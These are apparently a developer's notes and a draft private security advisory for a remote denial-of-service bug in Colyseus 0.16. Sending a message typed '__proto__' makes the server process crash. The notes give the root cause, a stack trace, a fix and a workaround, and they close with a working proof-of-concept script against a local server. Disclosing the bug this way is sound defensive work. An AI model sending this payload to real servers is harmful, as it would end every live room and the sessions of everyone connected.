# Colyseus 0.16.x — any client can crash the server with one message

Working notes for reporting this upstream. Not part of the product; delete once
it's filed and fixed.

Found by `server/src/attack.ts` on its first run during Phase 03.

## Report it privately first

This is a remote denial of service, not a normal bug, so it should not go
straight into a public issue tracker where it doubles as an exploit recipe.

1. Go to <https://github.com/colyseus/colyseus/security/advisories/new> — GitHub's
   private vulnerability reporting. Paste the report below.
2. If that form is disabled for the repo, use the Discord (<https://discord.gg/RY8rRS7>)
   to ask a maintainer for a private channel, or email the address in any
   `SECURITY.md` at the repo root.
3. Only open a public issue if a maintainer asks you to, or if they don't
   respond within ~90 days — the usual disclosure window.

Mention you're happy for it to be public once a fix ships; it's a small fix.

---

## The report

**Title:** Any authenticated client can crash the server by sending a message
whose type is `__proto__`

**Affected:** `@colyseus/core` 0.16.24 (via `colyseus` 0.16.5). Present in the
0.16 line. **Not confirmed on 0.17** — 0.17 restructured dispatch to
`onMessageEvents.events[...]` and looks like it disconnects the sender instead,
but I have not run it.

**Impact:** Remote denial of service. One WebSocket message terminates the Node
process, ending **every live room on that server**, not just the sender's. Any
client that can join a room can do it — no special privileges, no malformed
frame, just an unusual message type. On a single-instance deployment that is
total downtime.

**Cause:** `Room.onMessageHandlers` is a plain object:

```js
// Room.mjs, ~line 68
this.onMessageHandlers = {
  "__no_message_handler": { callback: ... }
};
```

Dispatch looks the type up directly:

```js
// Room.mjs, ~line 701
const messageTypeHandler = this.onMessageHandlers[messageType];
...
if (messageTypeHandler) {
  messageTypeHandler.callback(client, message);   // <- throws
} else {
  (this.onMessageHandlers["*"] || ...).callback(client, messageType, message);
}
```

For `messageType === "__proto__"` the lookup returns `Object.prototype`, which
is **truthy**, so:

- the `"*"` catch-all is skipped, and
- `.callback` is `undefined`, so `undefined(client, message)` throws
  `TypeError: messageTypeHandler.callback is not a function`

The throw happens inside the `ws` receiver callback, outside any try/catch, so
it becomes an uncaught exception and the process exits.

`constructor`, `toString`, `valueOf`, `hasOwnProperty` and any other
`Object.prototype` key behave the same way.

Defining `onUncaughtException` does not help: that only wraps *registered*
handlers, and this throw happens in the dispatch itself.

**Stack trace:**

```
TypeError: messageTypeHandler.callback is not a function
    at MatchRoom._onMessage (@colyseus/core/build/Room.mjs:715:28)
    at WebSocket.emit (node:events:509:28)
    at Receiver.receiverOnMessage (ws/lib/websocket.js:1239:20)
    at Receiver.dataMessage (ws/lib/receiver.js:606:14)
    ...
```

**Reproduction:** `repro.mjs` below — one file, no framework. Verified against
`@colyseus/core` 0.16.24 on Node 24.18.1:

```
sending 'hello' (normal unknown type)…
caught by '*': hello                       <- correct
sending '__proto__'…
TypeError: messageTypeHandler.callback is not a function
>>> PROCESS EXITED with code 1             <- the whole server
```

A normal unknown type reaches the catch-all as designed; `__proto__` bypasses it
and kills the process.

**Suggested fix:** give the registry a null prototype so inherited keys can't be
mistaken for handlers.

```js
this.onMessageHandlers = Object.create(null);
this.onMessageHandlers["__no_message_handler"] = { callback: ... };
```

`Object.prototype.hasOwnProperty.call(this.onMessageHandlers, messageType)` at
the lookup would also work. The same treatment is worth applying to
`onMessageValidators` in 0.17, which is still a plain object and is tested with
`!== undefined`.

**Workaround for anyone on 0.16**, in a Room subclass, before registering handlers:

```ts
const registry = this as unknown as { onMessageHandlers: Record<string, unknown> };
const safe = Object.create(null) as Record<string, unknown>;
Object.assign(safe, registry.onMessageHandlers);
registry.onMessageHandlers = safe;
```

---

## repro.mjs

```js
// npm i colyseus@0.16 colyseus.js @colyseus/ws-transport
// node repro.mjs   ->  server dies within a second
import { Server, Room } from "colyseus";
import { WebSocketTransport } from "@colyseus/ws-transport";
import { Client } from "colyseus.js";
import { createServer } from "node:http";

class Boom extends Room {
  onCreate() {
    // A catch-all is registered, so an unknown type SHOULD land here.
    this.onMessage("*", (_client, type) => console.log("caught:", type));
  }
}

const httpServer = createServer();
const gameServer = new Server({ transport: new WebSocketTransport({ server: httpServer }) });
gameServer.define("boom", Boom);
await gameServer.listen(2570);

process.on("exit", (code) => console.log("process exited with", code));

const room = await new Client("ws://localhost:2570").joinOrCreate("boom");
room.send("hello");      // logged by the catch-all, as expected
room.send("__proto__");  // uncaught TypeError, process dies
setTimeout(() => console.log("still alive?"), 1000);
```

Expected: `caught: __proto__`.
Actual: `TypeError: messageTypeHandler.callback is not a function`, process exits.
